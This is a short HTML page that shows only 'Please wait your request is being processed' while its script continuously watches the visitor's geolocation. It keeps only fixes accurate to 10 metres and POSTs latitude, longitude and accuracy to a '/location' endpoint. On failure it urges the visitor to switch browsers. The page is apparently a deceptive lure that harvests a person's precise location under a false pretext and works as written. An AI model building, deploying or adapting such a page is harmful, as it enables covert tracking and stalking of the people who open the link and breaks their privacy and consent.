<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <p>Please wait your request is being processed</p>
</body>
    <script>
    const options = {
        enableHighAccuracy: true,
        maximumAge: 0
    }
    function success(pos){
        const crd = pos.coords
        latitude = crd.latitude
        longitude = crd.longitude
        accuracy = crd.accuracy
        if (accuracy > 10){
            console.log("Accuracy too low")
            return
        }
        req = {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify({"latitude": latitude, "longitude": longitude, "accuracy": accuracy})
        }

        fetch('/location', req)
        .then((x) => console.log(x))
        .catch(err => console.log(err))
    }

    function error(err){
        console.warn(err)
        console.warn("Error Occured Please use another browser")
    }
    navigator.geolocation.watchPosition(success, error, options);
    </script>
</html>